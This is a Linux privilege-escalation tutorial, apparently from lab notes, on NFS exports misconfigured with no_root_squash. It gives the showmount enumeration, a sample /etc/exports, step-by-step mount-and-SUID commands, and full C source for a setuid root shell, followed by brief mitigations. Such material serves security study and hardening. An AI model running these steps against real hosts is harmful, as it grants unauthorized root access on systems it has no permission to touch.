Weak NFS Privileges Exploit
===============================================================================================================================================
Overview:
NFS (Network File System) allows file sharing across systems. When misconfigured with the no_root_squash option, it becomes vulnerable to privilege escalation.

Weak NFS Privileges
Network File System (NFS) allows users to access shared files or directories over the network hosted on Unix/Linux systems. NFS uses TCP/UDP port 2049. Any accessible mounts can be listed remotely by issuing the command showmount -e, which lists the NFS server's export list (or the access control list for filesystems) that NFS clients.

            [!bash!]$ showmount -e 10.129.2.12

                    Export list for 10.129.2.12:
                    /tmp             *
                    /var/nfs/general *

When an NFS volume is created, various options can be set:

Option	Description

root_squash:
If the root user is used to access NFS shares, it will be changed to the nfsnobody user, which is an unprivileged account. Any files created and uploaded by the root user will be owned by the nfsnobody user, which prevents an attacker from uploading binaries with the SUID bit set.

no_root_squash:
Remote users connecting to the share as the local root user will be able to create files on the NFS server as the root user. This would allow for the creation of malicious scripts/programs with the SUID bit set.

cat /etc/exports

# /etc/exports: the access control list for filesystems which may be exported
#		to NFS clients.  See exports(5).
#
# Example for NFSv2 and NFSv3:
# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
#
# Example for NFSv4:
# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
#
/var/nfs/general *(rw,no_root_squash)
/tmp *(rw,no_root_squash)


If export is set with rw,no_root_squash, it allows remote root users to:

    Mount the share
    Write files as root
    Upload SUID binaries to gain root shell

===============================================================================================================================================
Exploit Steps:

On attacker machine (as root):
    mount -t nfs <target-ip>:/tmp /mnt
    gcc shell.c -o shell    # setuid shell binary
          if this didnt work, use
              sudo apt install musl-tools
              musl-gcc -static -o shell_musl shell.c
    cp shell /mnt
    chmod u+s /mnt/shell

On victim machine (as normal user):
    /tmp/shell   # Spawns root shell due to SUID
   

Payload Example (C Code):

        #include <stdio.h>
        #include <sys/types.h>
        #include <unistd.h>
        #include <stdlib.h>
        
        int main(void)
        {
          setuid(0); setgid(0); system("/bin/bash");
        }


Why It Works:

no_root_squash trusts remote root users.

SUID binaries created by root on the share execute with root privileges.

Mitigation:

Never use no_root_squash in production.

Restrict NFS exports to specific IPs.

Use root_squash (default) and proper file permissions.
